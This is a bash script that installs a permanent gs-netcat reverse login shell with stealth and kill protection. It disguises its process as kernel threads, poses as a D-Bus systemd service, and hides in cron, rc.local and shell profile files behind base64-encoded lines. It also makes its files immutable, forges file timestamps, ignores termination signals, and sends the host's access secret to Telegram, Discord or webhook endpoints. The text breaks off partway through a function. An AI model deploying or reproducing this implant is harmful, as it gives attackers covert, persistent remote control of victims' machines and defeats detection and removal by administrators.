#!/usr/bin/env bash

# Install and start a permanent gs-netcat reverse login shell with enhanced stealth and kill protection
#
# See https://www.gsocket.io/deploy/ for examples.
#
# This script is typically invoked like this as root or non-root user:
#   $ bash -c "$(curl -fsSL https://gsocket.io/x)"
#
# Connect
#   $ S=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)"
# Pre-set a secret:
#   $ X=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)"
# Kill process (only with special command):
#   $ touch /tmp/kill_gs.txt
#   $ kill -SIGUSR1 $(pgrep -f "<hidden_process_name>")
#
# Other variables:
# GS_DEBUG=1
#		- Verbose output
#		- Shorter timeout to restart crontab etc
# GS_STEALTH=1
#       - Enable stealth mode (randomized file/process names, hidden directories, no logs)
# GS_USELOCAL=1
#       - Use local binaries (do not download)
# GS_USELOCAL_GSNC=<path to gs-netcat binary>
#       - Use local gs-netcat from source tree
# GS_NOSTART=1
#       - Do not start gs-netcat (for testing purpose only)
# GS_NOINST=1
#		- Do not install gsocket
# GS_OSARCH=x86_64-alpine
#       - Force architecture to a specific package (for testing purpose only)
# GS_PREFIX=
#		- Use 'path' instead of '/' (needed for packaging/testing)
# GS_URL_BASE=https://gsocket.io
#		- Specify URL of static binaries
# GS_URL_BIN=
#		- Specify URL of static binaries, defaults to https://${GS_URL_BASE}/bin
# GS_DSTDIR="/tmp/foobar/blah"
#		- Specify custom installation directory
# GS_HIDDEN_NAME="-bash"
#       - Specify custom hidden name for process, default is randomized
# GS_BIN_HIDDEN_NAME="gs-dbus"
#       - Specify custom name for binary on filesystem
# GS_DL=wget
#       - Command to use for download. =wget or =curl.
# GS_TG_TOKEN=
#       - Telegram Bot ID, =5794110125:AAFDNb...
# GS_TG_CHATID=
#       - Telegram Chat ID, =-8834838...
# GS_DISCORD_KEY=
#       - Discord API key
# GS_WEBHOOK_KEY=
#       - https://webhook.site key
# GS_WEBHOOK=
#       - Generic webhook
# GS_HOST=
#       - IP or HOSTNAME of the GSRN-Server
# GS_PORT=
#       - Port for the GSRN-Server. Default is 443.
# TMPDIR=
#       - Temporary directory

# Signal handler for kill command
signal_handler() {
    echo -e "${CG}Received SIGUSR1, stopping ${BIN_HIDDEN_NAME}...${CN}"
    ${KL_CMD} "${KL_CMD_RUNCHK_UARG[@]}" "${BIN_HIDDEN_NAME}" 2>/dev/null
    exit_code 0
}

# Register signal handler for SIGUSR1 and ignore common signals
trap signal_handler SIGUSR1
trap '' SIGTERM SIGHUP SIGINT

# Global Defines
URL_BASE_CDN="https://cdn.gsocket.io"
URL_BASE_X="https://gsocket.io"
[[ -n $GS_URL_BASE ]] && {
	URL_BASE_CDN="${GS_URL_BASE}"
	URL_BASE_X="${GS_URL_BASE}"
}
URL_BIN="${URL_BASE_CDN}/bin"       # mini & stripped version
URL_BIN_FULL="${URL_BASE_CDN}/full" # full version (with -h working)
[[ -n $GS_URL_BIN ]] && {
	URL_BIN="${GS_URL_BIN}"
	URL_BIN_FULL="$URL_BIN"
}
[[ -n $GS_URL_DEPLOY ]] && URL_DEPLOY="${GS_URL_DEPLOY}" || URL_DEPLOY="${URL_BASE_X}/y"

# STUBS for deploy_server.sh to fill out:
gs_deploy_webhook=
GS_WEBHOOK_404_OK=
[[ -n $gs_deploy_webhook ]] && GS_WEBHOOK="$gs_deploy_webhook"
unset gs_deploy_webhook

# WEBHOOKS are executed after a successful install
msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}'
### Telegram
[[ -n $GS_TG_TOKEN ]] && [[ -n $GS_TG_CHATID ]] && {
	GS_WEBHOOK_CURL=("--data-urlencode" "text=${msg}" "https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html")
	GS_WEBHOOK_WGET=("https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html&text=${msg}")
}
### Generic URL as webhook (any URL)
[[ -n $GS_WEBHOOK ]] && {
	GS_WEBHOOK_CURL=("$GS_WEBHOOK")
	GS_WEBHOOK_WGET=("$GS_WEBHOOK")
}
### webhook.site
[[ -n $GS_WEBHOOK_KEY ]] && {
	data='{"hostname": "$(hostname)", "system": "$(uname -rom)", "access": "gs-netcat -i -s ${GS_SECRET}"}'
	GS_WEBHOOK_CURL=('-H' 'Content-type: application/json' '-d' "${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
}
### discord webhook
[[ -n $GS_DISCORD_KEY ]] && {
	data='{"username": "gsocket", "content": "'"${msg}"'"}'
	GS_WEBHOOK_CURL=('-H' 'Content-Type: application/json' '-d' "${data}" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}")
	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}")
}
unset data
unset msg

DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
CONFIG_DIR_NAME="htop"

# Names for cleanup (excluding defunct)
BIN_HIDDEN_NAME_RM=("gs-dbus" "gs-db")
CONFIG_DIR_NAME_RM=("$CONFIG_DIR_NAME" "dbus")

[[ -t 1 ]] && {
	CY="\033[1;33m" # yellow
	CDY="\033[0;33m" # yellow
	CG="\033[1;32m" # green
	CR="\033[1;31m" # red
	CDR="\033[0;31m" # red
	CB="\033[1;34m" # blue
	CC="\033[1;36m" # cyan
	CDC="\033[0;36m" # cyan
	CM="\033[1;35m" # magenta
	CN="\033[0m"    # none
	CW="\033[1;37m"
}

if [[ -z "$GS_DEBUG" ]]; then
	DEBUGF(){ :;}
else
	DEBUGF(){ echo -e "${CY}DEBUG:${CN} $*";}
fi

_ts_fix()
{
	local fn
	local ts
	local args
	local ax
	fn="$1"
	ts="$2"

	args=() # OSX, must init or " " in touch " " -r 

	[[ ! -e "$1" ]] && return
	[[ -z $ts ]] && return

	[[ -n "$3" ]] && args=("-h")
	[[ "${ts:0:1}" = '/' ]] && {
		[[ ! -e "${ts}" ]] && ts="/etc/ld.so.conf"
		ax=("${args[@]}" "-r" "$ts" "$fn")
		touch "${ax[@]}" 2>/dev/null
		return
	}
	ax=("${args[@]}" "-t" "$ts" "$fn")
	touch "${ax[@]}" 2>/dev/null && return
	ax=("${args[@]}" "-r" "/etc/ld.so.conf" "$fn")
	touch "${ax[@]}" 2>/dev/null
}

ts_restore()
{
	local fn
	local n
	local ts

	[[ ${#_ts_fn_a[@]} -ne ${#_ts_ts_a[@]} ]] && { echo >&2 "Ooops"; return; }

	n=0
	while :; do
		[[ $n -eq "${#_ts_fn_a[@]}" ]] && break
		ts="${_ts_ts_a[$n]}"
		fn="${_ts_fn_a[$n]}"
		((n++))
		_ts_fix "$fn" "$ts"
	done
	unset _ts_fn_a
	unset _ts_ts_a

	n=0
	while :; do
		[[ $n -eq "${#_ts_systemd_ts_a[@]}" ]] && break
		ts="${_ts_systemd_ts_a[$n]}"
		fn="${_ts_systemd_fn_a[$n]}"
		((n++))
		_ts_fix "$fn" "$ts" "symlink"
	done
	unset _ts_systemd_fn_a
	unset _ts_systemd_ts_a
}

ts_is_marked()
{
	local fn
	local a
	fn="$1"

	for a in "${_ts_fn_a[@]}"; do
		[[ "$a" = "$fn" ]] && return 0 # True
	done
	return 1 # False
}

ts_add_systemd()
{
	local fn
	local ts
	local ref
	fn="$1"
	ref="$2"

	ts="$ref"
	[[ -z $ref ]] && {
		ts="$(date -r "$fn" +%Y%m%d%H%M.%S 2>/dev/null)" || return
	}
	_ts_systemd_ts_a+=("$ts")
	_ts_systemd_fn_a+=("$fn")
}

_ts_get_ts()
{
	local fn
	local n
	local pdir
	fn="$1"
	pdir="$(dirname "$1")"

	unset _ts_ts
	unset _ts_pdir_by_us
	n=0
	while :; do
		[[ $n -eq "${#_ts_fn_a[@]}" ]] && break
		[[ "$pdir" = "${_ts_mkdir_fn_a[$n]}" ]] && {
			_ts_ts="${_ts_ts_a[$n]}"
			_ts_pdir_by_us=1
			return
		}
		((n++))
	done
	[[ -e "$fn" ]] && _ts_ts="$(date -r "$fn" +%Y%m%d%H%M.%S 2>/dev/null)" && return
	oldest="${pdir}/$(ls -atr "${pdir}" 2>/dev/null | head -n1)"
	_ts_ts="$(date -r "$oldest" +%Y%m%d%H%M.%S 2>/dev/null)"
}

_ts_add()
{
	_ts_get_ts "$1"
	_ts_ts_a+=("$_ts_ts")
	_ts_fn_a+=("$1")
	_ts_mkdir_fn_a+=("$2")
}

mk_file()
{
	local fn
	local oldest
	local pdir
	local pdir_added
	fn="$1"
	local exists

	pdir="$(dirname "$fn")"
	[[ -e "$fn" ]] && exists=1

	ts_is_marked "$pdir" || {
		_ts_add "$pdir" "<NOT BY XMKDIR>"
		pdir_added=1
	}

	ts_is_marked "$fn" || {
		_ts_get_ts "$fn"
		touch "$fn" 2>/dev/null || {
			[[ -n "$pdir_added" ]] && {
				unset "_ts_ts_a[${#_ts_ts_a[@]}-1]"
				unset "_ts_fn_a[${#_ts_fn_a[@]}-1]"
				unset "_ts_mkdir_fn_a[${#_ts_mkdir_fn_a[@]}-1]"
			}
			return 69 # False
		}
		[[ -z $exists ]] && chmod 600 "$fn"
		_ts_ts_a+=("$_ts_ts")
		_ts_fn_a+=("$fn")
		_ts_mkdir_fn_a+=("<NOT BY XMKDIR>")
		return
	}

	touch "$fn" 2>/dev/null || return
	[[ -z $exists ]] && chmod 600 "$fn"
	command -v chattr >/dev/null && chattr +i "$fn" 2>/dev/null
	true
}

xrmdir()
{
	local fn
	local pdir
	fn="$1"

	[[ ! -d "$fn" ]] && return
	pdir="$(dirname "$fn")"

	ts_is_marked "$pdir" || {
		_ts_add "$pdir" "<RMDIR-UNTRACKED>"
	}

	command -v chattr >/dev/null && chattr -i "$fn" 2>/dev/null
	rmdir "$fn" 2>/dev/null
}

xrm()
{
	local pdir
	local fn
	fn="$1"

	[[ ! -f "$fn" ]] && return
	pdir="$(dirname "$fn")"

	ts_is_marked "$pdir" || {
		_ts_add "$pdir" "<RM-UNTRACKED>"
	}

	command -v chattr >/dev/null && chattr -i "$fn" 2>/dev/null
	rm -f "$1" 2>/dev/null
}

xmkdir()
{
	local fn
	local pdir
	fn="$1"

	DEBUGF "${CG}XMKDIR($fn)${CN}"
	pdir="$(dirname "$fn")"
	[[ -d "$fn" ]] && return
	[[ ! -d "$pdir" ]] && return

	ts_is_marked "$pdir" || {
		_ts_add "$pdir" "<NOT BY XMKDIR>"
	}

	ts_is_marked "$fn" || {
		_ts_add "$fn" "$fn"
	}

	mkdir "$fn" 2>/dev/null || return
	chmod 700 "$fn"
	command -v chattr >/dev/null && chattr +i "$fn" 2>/dev/null
	true
}

xcp()
{
	local src
	local dst
	src="$1"
	dst="$2"

	mk_file "$dst" || return
	cp "$src" "$dst" || return
	command -v chattr >/dev/null && chattr +i "$dst" 2>/dev/null
	true
}

xmv()
{
	local src
	local dst
	src="$1"
	dst="$2"

	[[ -e "$dst" ]] && xrm "$dst"
	xcp "$src" "$dst" || return
	xrm "$src"
	command -v chattr >/dev/null && chattr +i "$dst" 2>/dev/null
	true
}

clean_all()
{
	[[ "${#TMPDIR}" -gt 5 ]] && {
		rm -rf "${TMPDIR:?}/"*
		rmdir "${TMPDIR}"
	} &>/dev/null

	ts_restore
}

exit_code()
{
	clean_all
	exit "$1"
}

errexit()
{
	[[ -z "$1" ]] || echo -e >&2 "${CR}$*${CN}"
	exit_code 255
}

try_dstdir()
{
	local dstdir
	local trybin
	dstdir="${1}"

	[[ ! -d "${dstdir}" ]] && { xmkdir "${dstdir}" || return 101; }

	DSTBIN="${dstdir}/${BIN_HIDDEN_NAME}"

	mk_file "$DSTBIN" || return 102

	for ebin in "/bin/true" "$(command -v id)"; do
		[[ -z $ebin ]] && continue
		[[ -e "$ebin" ]] && break
	done
	[[ ! -e "$ebin" ]] && return 0

	trybin="${dstdir}/$(basename "$ebin")"
	[[ "$ebin" -ef "$trybin" ]] && return 0
	mk_file "$trybin" || return

	cp "$ebin" "$trybin" &>/dev/null || { rm -f "${trybin:?}"; return; }
	chmod 700 "$trybin"
	"${trybin}" -g &>/dev/null || { rm -f "${trybin:?}"; return 104; }
	rm -f "${trybin:?}"
	return 0
}

init_dstbin()
{
	if [[ -n "$GS_STEALTH" ]]; then
		GS_DSTDIR="${GS_DSTDIR:-/var/tmp/.cache-$((RANDOM%10000))}"
		try_dstdir "${GS_DSTDIR}" && {
			command -v chattr >/dev/null && chattr +i "${GS_DSTDIR}" 2>/dev/null
			return
		}
		errexit "FAILED: GS_DSTDIR=${GS_DSTDIR} is not writeable and executable in stealth mode."
	fi

	try_dstdir "${GS_PREFIX}/usr/bin" && return
	[[ ! -d "${GS_PREFIX}${HOME}/.config" ]] && xmkdir "${GS_PREFIX}${HOME}/.config"
	try_dstdir "${GS_PREFIX}${HOME}/.config/${CONFIG_DIR_NAME}" && return
	try_dstdir "${PWD}" && { IS_DSTBIN_CWD=1; return; }
	try_dstdir "/tmp/.gsusr-${UID}" && { IS_DSTBIN_TMP=1; return; }
	try_dstdir "/dev/shm" && { IS_DSTBIN_TMP=1; return; }
	errexit "ERROR: Can not find writeable and executable directory."
}

try_tmpdir()
{
	[[ -n $TMPDIR ]] && return
	[[ ! -d "$1" ]] && return
	[[ -d "$1" ]] && xmkdir "${1}/${2}" && TMPDIR="${1}/${2}"
}

try_encode()
{
	local enc
	local dec
	local teststr
	prg="$1"
	enc="$2"
	dec="$3"

	teststr="blha|;id-u \'this is a long test of a very long string to test encoding decoding process # foobar"

	[[ -n $ENCODE_STR ]] && return
	command -v "$prg" >/dev/null && [[ "$(echo "$teststr" | $enc 2>/dev/null| $dec 2>/dev/null)" = "$teststr" ]] || return
	ENCODE_STR="$enc"
	DECODE_STR="$dec"
}

is_le()
{
	command -v lscpu >/dev/null && {
		[[ $(lscpu) == *"Little Endian"* ]] && return 0
		return 255
	}
	command -v od >/dev/null && command -v awk >/dev/null && {
		[[ $(echo -n I | od -o | awk 'FNR==1{ print substr($2,6,1)}') == "1" ]] && return 0
	}
	return 255
}

init_vars()
{
	local arch
	local osname
	arch=$(uname -m)

	if [[ -z "$HOME" ]]; then
		HOME="$(grep ^"$(whoami)" /etc/passwd | cut -d: -f6)"
		[[ ! -d "$HOME" ]] && errexit "ERROR: \$HOME not set. Try 'export HOME=<users home directory>'"
		WARN "HOME not set. Using 'HOME=$HOME'"
	fi

	[[ -z "$PWD" ]] && PWD="$(pwd 2>/dev/null)"

	[[ -z "$OSTYPE" ]] && {
		osname="$(uname -s)"
		if [[ "$osname" == *FreeBSD* ]]; then
			OSTYPE="FreeBSD"
		elif [[ "$osname" == *Darwin* ]]; then
			OSTYPE="darwin22.0"
		elif [[ "$osname" == *OpenBSD* ]]; then
			OSTYPE="openbsd7.3"
		elif [[ "$osname" == *Linux* ]]; then
			OSTYPE="linux-gnu"
		fi
	}

	unset OSARCH
	unset SRC_PKG
	[[ -n "$GS_OSARCH" ]] && OSARCH="$GS_OSARCH"

	if [[ -z "$OSARCH" ]]; then
		if [[ $OSTYPE == *linux* ]]; then 
			if [[ "$arch" == "i686" ]] || [[ "$arch" == "i386" ]]; then
				OSARCH="i386-alpine"
				SRC_PKG="gs-netcat_mini-linux-i686"
			elif [[ "$arch" == *"armv6"* ]]; then
				OSARCH="arm-linux"
				SRC_PKG="gs-netcat_mini-linux-armv6"
			elif [[ "$arch" == *"armv7l" ]]; then
				OSARCH="arm-linux"
				SRC_PKG="gs-netcat_mini-linux-armv7l"
			elif [[ "$arch" == *"armv"* ]]; then
				OSARCH="arm-linux"
				SRC_PKG="gs-netcat_mini-linux-arm"
			elif [[ "$arch" == "aarch64" ]]; then
				OSARCH="aarch64-linux"
				SRC_PKG="gs-netcat_mini-linux-aarch64"
			elif [[ "$arch" == "mips64" ]]; then
				OSARCH="mips64-alpine"
				SRC_PKG="gs-netcat_mini-linux-mips64"
				is_le && {
					OSARCH="mipsel32-alpine"
					SRC_PKG="gs-netcat_mini-linux-mipsel"
				}
			elif [[ "$arch" == *mips* ]]; then
				OSARCH="mips32-alpine"
				SRC_PKG="gs-netcat_mini-linux-mips32"
				is_le && {
					OSARCH="mipsel32-alpine"
					SRC_PKG="gs-netcat_mini-linux-mipsel"
				}
			fi
		elif [[ $OSTYPE == *darwin* ]]; then
			if [[ "$arch" == "arm64" ]]; then
				OSARCH="x86_64-osx"
				SRC_PKG="gs-netcat_mini-macOS-x86_64"
			else
				OSARCH="x86_64-osx"
				SRC_PKG="gs-netcat_mini-macOS-x86_64"
			fi
		elif [[ ${OSTYPE,,} == *freebsd* ]]; then
				OSARCH="x86_64-freebsd"
				SRC_PKG="gs-netcat_mini-freebsd-x86_64"
		elif [[ ${OSTYPE,,} == *openbsd* ]]; then
				OSARCH="x86_64-openbsd"
				SRC_PKG="gs-netcat_mini-openbsd-x86_64"
		elif [[ ${OSTYPE,,} == *cygwin* ]]; then
			OSARCH="i686-cygwin"
			[[ "$arch" == "x86_64" ]] && OSARCH="x86_64-cygwin"
		fi
		[[ -z "$OSARCH" ]] && {
			OSARCH="x86_64-alpine"
			SRC_PKG="gs-netcat_mini-linux-x86_64"
		}
	}

	[[ -z "$USER" ]] && USER=$(id -un)
	[[ -z "$UID" ]] && UID=$(id -u)

	try_encode "base64" "base64 -w0" "base64 -d"
	try_encode "xxd" "xxd -ps -c1024" "xxd -r -ps"
	DEBUGF "ENCODE_STR='${ENCODE_STR}'"
	[[ -z "$SRC_PKG" ]] && SRC_PKG="gs-netcat_${OSARCH}.tar.gz"

	if [[ $OSTYPE == *darwin* ]]; then
		KL_CMD="killall"
		KL_CMD_RUNCHK_UARG=("-0" "-u${USER}")
	elif command -v pkill >/dev/null; then
		KL_CMD="pkill"
		KL_CMD_RUNCHK_UARG=("-0" "-U${UID}")
	elif command -v killall >/dev/null; then
		KL_CMD="killall"
		KL_CMD_RUNCHK_UARG=("-0" "-u${USER}")
	fi

	KL_CMD_BIN="$(command -v "$KL_CMD")"
	[[ -z $KL_CMD_BIN ]] && {
		KL_CMD_BIN="$(command -v false)"
		[[ -z $KL_CMD_BIN ]] && KL_CMD_BIN="/bin/does-not-exit"
		WARN "No pkill or killall found."
	}

	# Randomize process and file names for all modes
	proc_name_arr=("[kworker/$((RANDOM%10)):0]" "[ksoftirqd/$((RANDOM%10))]" "[kblockd/$((RANDOM%10))]" "[khugepaged]" "[rcu_sched]" "[jbd2/sda1-$((RANDOM%100))]")
	PROC_HIDDEN_NAME_DEFAULT="${proc_name_arr[$((RANDOM % ${#proc_name_arr[@]}))]}"
	BIN_HIDDEN_NAME_DEFAULT="kworker-$((RANDOM%10000)).bin"
	BIN_HIDDEN_NAME_RM=("gs-dbus" "gs-db")

	PROC_HIDDEN_NAME_RX=""
	for str in "${proc_name_arr[@]}"; do
		PROC_HIDDEN_NAME_RX+="|$(echo "$str" | sed 's/[^a-zA-Z0-9]/\\&/g')"
	done
	PROC_HIDDEN_NAME_RX="${PROC_HIDDEN_NAME_RX:1}"

	if [[ -n $GS_BIN_HIDDEN_NAME ]]; then
		BIN_HIDDEN_NAME="${GS_BIN_HIDDEN_NAME}"
		BIN_HIDDEN_NAME_RM+=("$GS_BIN_HIDDEN_NAME")
	else
		BIN_HIDDEN_NAME="${GS_HIDDEN_NAME:-$BIN_HIDDEN_NAME_DEFAULT}"
	fi
	BIN_HIDDEN_NAME_RX=$(echo "$BIN_HIDDEN_NAME" | sed 's/[^a-zA-Z0-9]/\\&/g')
	
	SEC_NAME="${BIN_HIDDEN_NAME}.dat"
	if [[ -n $GS_HIDDEN_NAME ]]; then
		PROC_HIDDEN_NAME="${GS_HIDDEN_NAME}"
		PROC_HIDDEN_NAME_RX+="|$(echo "$GS_HIDDEN_NAME" | sed 's/[^a-zA-Z0-9]/\\&/g')"
	else
		PROC_HIDDEN_NAME="$PROC_HIDDEN_NAME_DEFAULT"
	fi

	SERVICE_HIDDEN_NAME="${BIN_HIDDEN_NAME}"
	RCLOCAL_DIR="${GS_PREFIX}/etc"
	RCLOCAL_FILE="${RCLOCAL_DIR}/rc.local"
	[[ -f ~/.zshrc ]] && RC_FN_LIST+=(".zshrc")
	if [[ -f ~/.bashrc ]]; then
		RC_FN_LIST+=(".bashrc")
	else
		if [[ -f ~/.bash_profile ]]; then
			RC_FN_LIST+=(".bash_profile")
		elif [[ -f ~/.bash_login ]]; then
			RC_FN_LIST+=(".bash_login")
		fi
	fi
	[[ -f ~/.profile ]] && RC_FN_LIST+=(".profile")
	[[ ${#RC_FN_LIST[@]} -eq 0 ]] && RC_FN_LIST+=(".profile")

	[[ -d "${GS_PREFIX}/etc/systemd/system" ]] && SERVICE_DIR="${GS_PREFIX}/etc/systemd/system"
	[[ -d "${GS_PREFIX}/lib/systemd/system" ]] && SERVICE_DIR="${GS_PREFIX}/lib/systemd/system"
	WANTS_DIR="${GS_PREFIX}/etc/systemd/system"
	SERVICE_FILE="${SERVICE_DIR}/${SERVICE_HIDDEN_NAME}.service"
	SYSTEMD_SEC_FILE="${SERVICE_DIR}/${SEC_NAME}"
	RCLOCAL_SEC_FILE="${RCLOCAL_DIR}/${SEC_NAME}"

	CRONTAB_DIR="${GS_PREFIX}/var/spool/cron/crontabs"
	[[ ! -d "${CRONTAB_DIR}" ]] && CRONTAB_DIR="${GS_PREFIX}/etc/cron/crontabs"

	local pids
	pids="$(pgrep "${BIN_HIDDEN_NAME_RX}" 2>/dev/null)"
	[[ -z $pids ]] && pids="$(pgrep "(${PROC_HIDDEN_NAME_RX})" 2>/dev/null)"
	[[ -n $pids ]] && OLD_PIDS="${pids//$'\n'/ }"
	unset pids

	if [[ -n "$GS_USELOCAL" ]]; then
		DL_CMD="./deploy-all.sh"
	elif command -v curl >/dev/null; then
		DL_CMD="$DL_CRL"
	elif command -v wget >/dev/null; then
		DL_CMD="$DL_WGT"
	else
		FAIL_OUT "Need curl or wget. Try ${CM}apt install curl${CN}"
		errexit
	fi

	[[ $GS_DL == "wget" ]] && DL_CMD="$DL_WGT"
	[[ $GS_DL == "curl" ]] && DL_CMD="$DL_CRL"
	if [[ "$DL_CMD" == "$DL_CRL" ]]; then
		IS_USE_CURL=1
		DL=("curl" "-fsSL" "--connect-timeout" "7" "-m900" "--retry" "3")
		[[ -n $GS_DEBUG ]] && DL+=("-v")
		[[ -n $GS_NOCERTCHECK ]] && DL+=("-k")
	elif [[ "$DL_CMD" == "$DL_WGT" ]]; then
		IS_USE_WGET=1
		DL=("wget" "-O-" "--connect-timeout=7" "--dns-timeout=7")
		[[ -n $GS_NOCERTCHECK ]] && DL+=("--no-check-certificate")
	else
		DL=("false")
	fi

	[[ $SHELL == *"nologin"* ]] && unset SHELL
	[[ $SHELL == *"jail"* ]] && unset SHELL
	[[ $SHELL == *"noshell"* ]] && unset SHELL
	[[ $SHELL == *"/dev/null"* ]] && unset SHELL
	[[ -n $SHELL ]] && [[ "$("$SHELL" -c "echo TRUE" 2>/dev/null)" != "TRUE" ]] && unset SHELL

	DEBUGF "OLD_PIDS='$OLD_PIDS'"
	DEBUGF "SRC_PKG=$SRC_PKG"
}

mk_encode()
{
	echo "{ echo $(echo "$1"|${ENCODE_STR})|${DECODE_STR}|bash;} 2>/dev/null #1b5b324a50524e47 >/dev/random # seed prng ${BIN_HIDDEN_NAME}-kernel"
}

check_kill_trigger()
{
	local kill_trigger="/tmp/kill_gs.txt"
	if [[ -f "$kill_trigger" ]]; then
		# Verify ownership and permissions
		if [[ $(stat -c '%u' "$kill_trigger" 2>/dev/null) -eq $UID ]]; then
			echo -e "${CG}Kill trigger detected, stopping ${BIN_HIDDEN_NAME}...${CN}"
			${KL_CMD} "${KL_CMD_RUNCHK_UARG[@]}" "${BIN_HIDDEN_NAME}" 2>/dev/null
			rm -f "$kill_trigger" 2>/dev/null
			exit_code 0
		else
			echo -e "${CR}Invalid kill trigger: Wrong ownership or permissions${CN}"
		fi
	}
}

init_setup()
{
	[[ -n "$GS_STEALTH" ]] && exec 1>/dev/null 2>&1
	[[ -n $TMPDIR ]] && try_tmpdir "${TMPDIR}" ".gs-${UID}"
	try_tmpdir "/dev/shm" ".gs-${UID}"
	try_tmpdir "/tmp" ".gs-${UID}"
	try_tmpdir "${HOME}" ".gs"
	try_tmpdir "$(pwd)" ".gs-${UID}"

	if [[ -n "$GS_PREFIX" ]]; then
		mkdir -p "${GS_PREFIX}/etc" 2>/dev/null
		mkdir -p "${GS_PREFIX}/usr/bin" 2>/dev/null
		mkdir -p "${GS_PREFIX}${HOME}" 2>/dev/null
		if [[ -f "${HOME}/${RC_FN_LIST[1]}" ]]; then
			xcp -p "${HOME}/${RC_FN_LIST[1]}" "${GS_PREFIX}${HOME}/${RC_FN_LIST[1]}"
		fi
		xcp -p /etc/rc.local "${GS_PREFIX}/etc/"
	fi

	command -v tar >/dev/null || errexit "Need tar. Try ${CM}apt install tar${CN}"
	command -v gzip >/dev/null || errexit "Need gzip. Try ${CM}apt install gzip${CN}"

	touch "${TMPDIR}/.gs-rw.lock" || errexit "FAILED. No temporary directory found for downloading package. Try setting TMPDIR="
	rm -f "${TMPDIR}/.gs-rw.lock" 2>/dev/null

	init_dstbin

	NOTE_DONOTREMOVE="# DO NOT REMOVE THIS LINE. SEED PRNG. #${BIN_HIDDEN_NAME}-kernel"
	USER_SEC_FILE="$(dirname "${DSTBIN}")/${SEC_NAME}"

	[[ -n $GS_HOST ]] && ENV_LINE+=("GS_HOST='${GS_HOST}'")
	[[ -n $GS_PORT ]] && ENV_LINE+=("GS_PORT='${GS_PORT}'")
	[[ ${#ENV_LINE[@]} -ne 0 ]] && ENV_LINE+=("")

	RCLOCAL_LINE="${ENV_LINE[*]}HOME=$HOME SHELL=$SHELL TERM=xterm-256color GS_ARGS=\"-k ${RCLOCAL_SEC_FILE} -liqD\" $(command -v bash) -c \"cd /root; exec -a '${PROC_HIDDEN_NAME}' ${DSTBIN}\" &>/dev/null"
	PROFILE_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || (${ENV_LINE[*]}TERM=xterm-256color GS_ARGS=\"-k ${USER_SEC_FILE} -liqD\" exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}' &>/dev/null)"
	CRONTAB_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || ${ENV_LINE[*]}SHELL=$SHELL TERM=xterm-256color GS_ARGS=\"-k ${USER_SEC_FILE} -liqD\" $(command -v bash) -c \"exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}' &>/dev/null\""

	if [[ -n $ENCODE_STR ]]; then
		RCLOCAL_LINE="$(mk_encode "$RCLOCAL_LINE")"
		PROFILE_LINE="$(mk_encode "$PROFILE_LINE")"
		CRONTAB_LINE="$(mk_encode "$CRONTAB_LINE")"
	fi

	DEBUGF "TMPDIR=${TMPDIR}"
	DEBUGF "DSTBIN=${DSTBIN}"
}

gs_secret_reload()
{
	[[ -n $GS_SECRET_FROM_FILE ]] && return
	[[ ! -f "$1" ]] && return
	local sec
	sec=$(<"$1")
	[[ ${#sec} -lt 4 ]] && return
	WARN "Using existing secret from '${1}'"
	if [[ ${#sec} -lt 10 ]]; then
		WARN "SECRET in '${1}' is very short! (${#sec})"
	fi
	GS_SECRET_FROM_FILE=$sec
}

gs_secret_write()
{
	mk_file "$1" || return
	echo "$GS_SECRET" >"$1" || return
	command -v chattr >/dev/null && chattr +i "$1" 2>/dev/null
}

install_system_systemd()
{
	[[ ! -d "${SERVICE_DIR}" ]] && return
	command -v systemctl >/dev/null || return
	[[ "$(systemctl is-system-running 2>/dev/null)" =~ (offline|^$) ]] && return
	if [[ -f "${SERVICE_FILE}" ]]; then
		((IS_INSTALLED+=1))
		IS_SKIPPED=1
		if systemctl is-active "${SERVICE_HIDDEN_NAME}" &>/dev/null; then
			IS_GS_RUNNING=1
		fi
		IS_SYSTEMD=1
		SKIP_OUT "${SERVICE_FILE} already exists."
		return
	fi

	mk_file "${SERVICE_FILE}" || return
	chmod 644 "${SERVICE_FILE}"
	echo "[Unit]
Description=D-Bus System Connection Bus
After=network.target

[Service]
Type=simple
Restart=always
RestartSec=300
WorkingDirectory=/root
ExecStart=/bin/bash -c \"${ENV_LINE[*]}GS_ARGS='-k $SYSTEMD_SEC_FILE -ilq' exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}' &>/dev/null\"

[Install]
WantedBy=multi-user.target" >"${SERVICE_FILE}" || return

	gs_secret_write "$SYSTEMD_SEC_FILE"
	ts_add_systemd "${WANTS_DIR}/multi-user.target.wants"
	ts_add_systemd "${WANTS_DIR}/multi-user.target.wants/${SERVICE_HIDDEN_NAME}.service" "${SERVICE_FILE}"

	systemctl enable "${SERVICE_HIDDEN_NAME}" &>/dev/null || { rm -f "${SERVICE_FILE:?}" "${SYSTEMD_SEC_FILE:?}"; return; }
	IS_SYSTEMD=1
	((IS_INSTALLED+=1))
}

install_to_file()
{
	local fname="$1"
	shift 1
	mk_file "$fname" || return
	D="$(IFS=$'\n'; head -n1 "${fname}" && \
		echo "${*}" && \
		tail -n +2 "${fname}")"
	echo 2>/dev/null "$D" >"${fname}" || return
	command -v chattr >/dev/null && chattr +i "$fname" 2>/dev/null
	true
}

install_system_rclocal()
{
	[[ ! -f "${RCLOCAL_FILE}" ]] && return
	[[ ! -x "${RCLOCAL_FILE}" ]] && return
	if grep -F -- "$BIN_HIDDEN_NAME" "${RCLOCAL_FILE}" &>/dev/null; then
		((IS_INSTALLED+=1))
